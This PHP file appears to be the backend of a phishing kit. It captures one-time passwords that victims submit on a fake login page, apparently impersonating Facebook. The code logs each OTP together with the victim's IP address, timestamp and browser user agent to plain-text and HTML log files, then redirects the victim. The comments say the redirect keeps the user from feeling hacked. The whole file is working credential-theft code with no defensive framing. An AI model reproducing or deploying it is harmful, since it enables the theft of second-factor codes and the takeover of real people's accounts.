<?php
// The 'loginBackend'

// GET THE POST METHODS
$otp = $_POST['otp'];
$phish = $_POST["phish"];


if(isset($otp))
{

    $texts_commandline = "\n ***DATA***INSERTED***\n\nOTP:: ".$otp.$_SERVER['REMOTE_ADDR']."\nTime:: ".date("F j, Y, g:i a")."\nDevice:: ".$_SERVER['HTTP_USER_AGENT']."\n\n  **********************\n\n\n\n";

    $texts_browser = "     
     <tr>
        <th scope=\"row\"> - </th>
	<td>" . $otp . "</td>
        <td>" . $_SERVER['REMOTE_ADDR'] . "</td>
        <td>" . date('F j, Y, g:i a') . "</td>
        <td>" . $_SERVER['HTTP_USER_AGENT'] . "</td>
     </tr>\n";

    $fp = fopen(__DIR__.'/../../storage/otp.txt', 'a');
    $fp2 = fopen(__DIR__.'/../../storage/browserOtp.txt','a');

    fwrite($fp,$texts_commandline );
    fwrite($fp2,$texts_browser);
    fclose($fp);
    fclose($fp2);

    if($phish=="fb"){
        // After successfully record now redirect to Official Facebook so the user, doesnot feel hacked! haha
        header("Location: /");
    }else{
        // After successfully record now redirect to Official Facebook so the user, doesnot feel hacked! haha
        header("Location: /");

    }


}
?>



